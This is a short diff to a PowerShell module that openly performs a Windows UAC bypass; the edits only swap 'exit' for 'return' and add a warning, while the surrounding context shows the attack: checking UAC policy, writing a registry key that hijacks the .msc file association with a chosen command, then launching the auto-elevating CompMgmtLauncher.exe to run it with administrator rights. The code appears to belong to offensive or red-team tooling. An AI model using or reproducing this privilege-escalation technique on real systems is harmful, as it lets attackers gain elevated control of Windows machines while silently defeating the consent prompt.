@@ -36,8 +36,8 @@ This will write out "Is Elevated: True" to C:\UACBypassTest.
     $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
 
     if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
-        "UAC is set to 'Always Notify'. This module does not bypass this setting."
-        exit
+        Write-Warning "UAC is set to 'Always Notify'. This module does not bypass this setting."
+        return
     }
     else{
         #Begin Execution
@@ -49,14 +49,14 @@ This will write out "Is Elevated: True" to C:\UACBypassTest.
                 New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
         }else{
             Write-Warning "Key already exists, consider using -Force"
-            exit
+            return
         }
 
         if (Test-Path $mscCommandPath) {
             Write-Verbose "Created registry entries to hijack the msc extension"
         }else{
             Write-Warning "Failed to create registry key, exiting"
-            exit
+            return
         }
 
         $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'CompMgmtLauncher.exe'
